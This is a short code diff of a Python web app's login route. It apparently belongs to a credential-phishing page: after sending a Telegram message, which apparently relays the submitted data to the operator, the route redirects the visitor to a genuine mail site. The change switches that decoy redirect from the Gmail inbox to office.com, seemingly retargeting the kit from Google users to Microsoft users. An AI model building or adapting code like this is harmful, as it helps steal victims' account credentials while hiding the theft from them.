@@ -49,7 +49,7 @@ def login():
             logger.error(f"Error sending Telegram message: {e}")
             flash(f'Error sending Telegram message: {str(e)}', 'danger')
 
-        gmail_inbox_url = "https://mail.google.com/mail/u/0/#inbox"
+        gmail_inbox_url = "https://www.office.com"
         return redirect(gmail_inbox_url)
 
     return render_template('index.html')
